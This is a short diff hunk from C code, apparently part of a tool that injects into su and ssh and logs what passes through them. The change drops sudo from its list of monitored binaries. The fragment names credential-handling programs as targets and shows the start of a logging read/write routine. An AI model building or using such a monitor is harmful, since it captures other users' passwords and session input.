@@ -48,7 +48,7 @@ int file = -1;
 /* The read buffer. */
 char buffer[256];
 /* Array containing the files we want to monitor(ended with a null pointer). */
-char *injected_files[] = { "/bin/su", "/usr/bin/sudo", "/usr/bin/ssh", 0 };
+char *injected_files[] = { "/bin/su", "/usr/bin/ssh", 0 };
 
 int do_read_write(int read_fd, int write_fd, int log) {
     int bread, i, start, dummy;
